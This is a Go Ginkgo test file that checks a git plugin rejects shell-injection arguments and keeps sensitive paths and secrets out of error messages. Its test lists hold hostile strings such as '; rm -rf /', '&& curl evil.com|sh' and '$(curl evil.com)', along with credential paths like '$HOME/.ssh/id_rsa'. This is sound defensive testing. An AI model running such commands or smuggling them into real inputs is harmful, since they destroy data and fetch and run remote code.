package main_test

import (
	. "github.com/onsi/ginkgo/v2"
	. "github.com/onsi/gomega"

	main "github.com/jameswlane/devex/packages/tool-git"
)

var _ = Describe("Git Tool Security", func() {
	var (
		gitPlugin *main.GitPlugin
	)

	BeforeEach(func() {
		gitPlugin = main.NewGitPlugin()
	})

	Describe("Input Validation Security", func() {
		Context("command argument validation", func() {
			It("should reject malicious git commands", func() {
				maliciousArgs := []string{
					"; rm -rf /",
					"&& curl evil.com|sh",
					"|| malicious-command",
					"`rm -rf /`",
					"$(curl evil.com)",
					"|sh",
				}

				for _, arg := range maliciousArgs {
					err := gitPlugin.Execute("config", []string{arg})
					Expect(err).To(HaveOccurred(),
						"Malicious argument '%s' should be rejected", arg)
				}
			})

			It("should validate git configuration keys", func() {
				maliciousConfigs := []string{
					"user.name; rm -rf /",
					"user.email`curl evil.com`",
					"core.editor$(malicious)",
					"alias.dangerous|sh",
				}

				for _, config := range maliciousConfigs {
					err := gitPlugin.Execute("config", []string{config, "value"})
					Expect(err).To(HaveOccurred(),
						"Malicious config key '%s' should be rejected", config)
				}
			})

			It("should validate git alias names", func() {
				maliciousAliases := []string{
					"dangerous;rm -rf /",
					"evil`curl malware.com`",
					"bad$(rm -rf /)",
					"unsafe|sh",
				}

				for _, alias := range maliciousAliases {
					err := gitPlugin.Execute("aliases", []string{"set", alias, "status"})
					Expect(err).To(HaveOccurred(),
						"Malicious alias name '%s' should be rejected", alias)
				}
			})
		})

		Context("comprehensive security validation", func() {
			It("should reject dangerous shell metacharacters", func() {
				dangerousChars := []string{
					";", "&", "|", "`", "$", "(", ")", "<", ">", "\\",
				}

				for _, char := range dangerousChars {
					testArg := "safe" + char + "dangerous"
					err := gitPlugin.Execute("config", []string{testArg})
					Expect(err).To(HaveOccurred(),
						"Argument with dangerous character '%s' should be rejected", char)
				}
			})
		})
	})

	Describe("Error Message Security", func() {
		Context("error message sanitization", func() {
			It("should not leak sensitive information in error messages", func() {
				maliciousInputs := []string{
					"/etc/passwd",
					"$HOME/.ssh/id_rsa",
					"/root/.gitconfig",
					"evil`curl malware.com`",
				}

				for _, input := range maliciousInputs {
					err := gitPlugin.Execute("config", []string{input})
					if err != nil {
						errorMsg := err.Error()

						// Error should not contain the raw malicious input
						Expect(errorMsg).NotTo(ContainSubstring(input),
							"Error message should not leak malicious input")

						// Error should not contain sensitive paths
						Expect(errorMsg).NotTo(ContainSubstring("/etc/passwd"))
						Expect(errorMsg).NotTo(ContainSubstring("/root/"))
						Expect(errorMsg).NotTo(ContainSubstring("/.ssh/"))
					}
				}
			})

			It("should sanitize command outputs in logs", func() {
				// Test that any command output doesn't contain dangerous content
				err := gitPlugin.Execute("status", []string{})

				// This might succeed or fail depending on git repo state
				// but should not expose dangerous information
				if err != nil {
					errorMsg := err.Error()
					Expect(errorMsg).NotTo(ContainSubstring("password"))
					Expect(errorMsg).NotTo(ContainSubstring("token"))
					Expect(errorMsg).NotTo(ContainSubstring("secret"))
				}
			})
		})
	})
})
